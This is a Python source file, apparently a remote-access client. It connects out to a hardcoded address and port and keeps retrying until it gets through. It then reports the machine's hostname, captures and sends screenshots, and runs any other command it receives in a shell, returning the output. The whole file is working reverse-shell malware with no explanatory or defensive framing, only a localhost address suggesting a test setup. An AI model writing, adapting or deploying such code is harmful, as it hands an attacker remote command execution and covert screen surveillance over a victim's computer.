import socket
import subprocess
import pyautogui
import time

IP = "127.0.0.1"
PORT = 13064
RETRY_TIME = 0.1

def connect_to_server():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((IP, PORT))
            print(f"Connected to {IP}:{PORT}")
            return sock
        except (socket.error, KeyboardInterrupt):
            print(f"Failed to connect. Retrying in {RETRY_TIME} seconds...")
            time.sleep(RETRY_TIME)  

def handle_communication(sock):
    try:
        while True:
            try:
                data = sock.recv(1024).decode().lower()

                if data == "name":
                    sock.send(socket.gethostname().encode())
                elif data == "exit":
                    sock.close()
                    return
                elif data == "screenshot":
                    try:
                        screenshot = pyautogui.screenshot()
                        screenshot.save('./screenshot.png')

                        with open('./screenshot.png', 'rb') as f:
                            file_data = f.read()
                            sock.sendall(len(file_data).to_bytes(4, 'big'))
                            sock.sendall(file_data)

                        sock.send("Screenshot sent.".encode())
                    except Exception as e:
                        sock.send(f"Failed to take screenshot: {str(e)}".encode())
                else:
                    try:
                        result = subprocess.run(data, shell=True, capture_output=True, text=True)
                        if result.stdout:
                            sock.send(result.stdout.encode())
                        elif result.stderr:
                            sock.send(result.stderr.encode())
                        else:
                            sock.send("Command executed, no output.".encode())
                    except Exception as e:
                        sock.send(f"Error executing command: {str(e)}".encode())
            except socket.error:
                print("Connection lost. Attempting to reconnect...")
                sock.close()
                return
    except KeyboardInterrupt:
        print("\nClosing socket.")
        sock.close()
        exit(0)

while True:
    sock = connect_to_server()
    handle_communication(sock)
